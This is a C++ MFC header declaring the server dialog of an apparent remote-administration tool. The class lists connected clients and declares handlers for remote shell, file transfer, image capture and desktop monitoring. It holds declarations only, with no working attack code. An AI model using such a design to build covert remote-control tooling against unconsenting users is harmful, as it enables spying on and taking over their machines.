#pragma once

#include "Service.h"
#include "ServerSocket.h"

#define WM_RECV_CHANNEL_SUCCESS_C2S (WM_USER+250)


// CMuaServerDlg 对话框
class CMuaServerDlg : public CDialogEx
{
// 构造
public:
	CMuaServerDlg(CWnd* pParent = nullptr);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_MUASERVER_DIALOG };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持
	virtual BOOL PreTranslateMessage(MSG* pMsg);


// 实现
public: 
	CServerSocket* m_pServerSocket = nullptr;			// 主socket
	CClientManager* m_pClientManager = nullptr;			// 管理连接的客户端

	CListCtrl m_ClientList;
	CEdit m_EditIP;
	CEdit m_EditPort;


protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()


public:
	void AddClient2List(QWORD qwClientToken, nsMainSocket::_LoginPacket_C2S mData);

	afx_msg void OnBnClickedStartListen();
	afx_msg void OnBnClickedCloseSocket();
	afx_msg void OnRClickMenu(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnClose();

	afx_msg void OnCloseClient();
	afx_msg void OnRemoteShell();
	afx_msg void OnFileTransfer();
	afx_msg void OnImageCapture();

	void OnDesktopMonitor();

	afx_msg LRESULT OnRecvChannelSuccessC2S(WPARAM wParam, LPARAM lParam);
};
